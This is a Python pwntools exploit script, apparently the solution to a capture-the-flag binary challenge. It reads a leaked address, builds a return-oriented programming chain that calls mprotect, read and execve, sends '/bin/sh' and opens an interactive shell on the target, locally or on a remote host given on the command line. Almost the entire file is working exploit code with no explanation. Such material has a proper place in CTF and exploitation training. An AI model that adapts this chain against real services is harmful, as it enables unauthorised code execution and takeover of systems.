#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+382
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.recvuntil(b"toolbox: ")
    s = int(io.recvline().strip(), 16)
    info("toolbox: %#x", s)

    pop_rdi = s + 0x68f
    pop_rsi = s + 0x7f
    pop_rdx = s + 0x88af
    pop_rax = s + 0x1b2f
    syscall = s + 0x154a5e

    ropchain = flat(
        [
            # mprotect(addr, len, prot)
            pop_rdi,
            s,
            pop_rsi,
            0x1000000,
            pop_rdx,
            7,
            pop_rax,
            0xa,
            syscall,
            # read(fd, buf, count)
            pop_rdi,
            0,
            pop_rsi,
            s + 0x500,
            pop_rdx,
            0x9,
            pop_rax,
            0x0,
            syscall,
            # execve(pathname, argv, envp)
            pop_rdi,
            s + 0x500,
            pop_rsi,
            0,
            pop_rdx,
            0,
            pop_rax,
            0x3b,
            syscall
        ]
    )

    payload = ropchain.ljust(0x1000, b"A")
    
    io.sendafter(b"key:", b"A"*15)
    io.sendafter(b"ROP:", payload)
    io.sendline(b"/bin/sh\x00")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

